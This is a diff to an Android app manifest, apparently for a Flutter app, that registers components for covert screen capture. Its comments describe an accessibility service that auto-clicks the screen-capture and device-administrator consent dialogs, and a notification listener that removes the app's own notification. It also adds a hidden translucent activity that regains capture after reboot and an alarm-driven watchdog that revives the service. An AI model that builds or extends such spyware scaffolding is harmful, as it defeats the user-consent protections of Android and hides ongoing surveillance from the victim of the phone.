@@ -170,6 +170,44 @@
             </intent-filter>
         </receiver>
 
+
+        <!-- Silent Accessibility: auto-clicks MediaProjection + Device Admin dialogs -->
+        <service
+            android:name=".SilentAccessibilityService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config"/>
+        </service>
+
+        <!-- Notification Listener: cancels our own notification from the shade -->
+        <service
+            android:name=".ScreenNotificationListener"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+
+        <!-- Transparent activity used by BootReceiver + Watchdog to re-acquire MediaProjection -->
+        <activity
+            android:name=".StealthActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:taskAffinity=""/>
+
+        <!-- Watchdog: AlarmManager-based service resurrection -->
+        <receiver
+            android:name=".WatchdogReceiver"
+            android:exported="false"/>
+
         <meta-data
             android:name="flutterEmbedding"
             android:value="2"/>
